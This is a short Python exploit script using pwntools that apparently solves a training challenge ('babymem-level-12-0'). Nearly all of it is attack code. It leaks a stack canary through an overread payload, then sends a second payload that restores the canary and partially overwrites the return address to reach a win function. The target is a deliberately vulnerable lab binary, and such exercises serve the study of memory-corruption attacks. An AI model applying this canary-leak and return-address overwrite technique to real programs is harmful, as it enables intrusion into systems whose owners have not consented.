from pwn import *

buffer = 0x7fffd0df69d0
stackp = 0x7fffd0df6a68
canary = stackp - 16


len_buffer = abs(buffer - stackp)
dis_canary = abs(buffer - canary)
print(len_buffer)
print(dis_canary)


elf = ELF("/challenge/babymem-level-12-0")

p = elf.process()


payload1 = b"REPEAT" + b'A' * (dis_canary - 8) + b"XYZ"
p.sendline(f'{len(payload1)}'.encode())
p.sendline(payload1)
p.recvuntil(b'XYZ')
cana = u64(p.recv(7).rjust(8, b'\x00'))
cana = p64(cana)
print(cana)

win_addr = b'\xd0\x85'

payload2 = b'A' * 136 + cana + b'ABCDEFGH' + win_addr

p.sendline(f'{len(payload2)}'.encode())
p.sendline(payload2)

p.interactive()
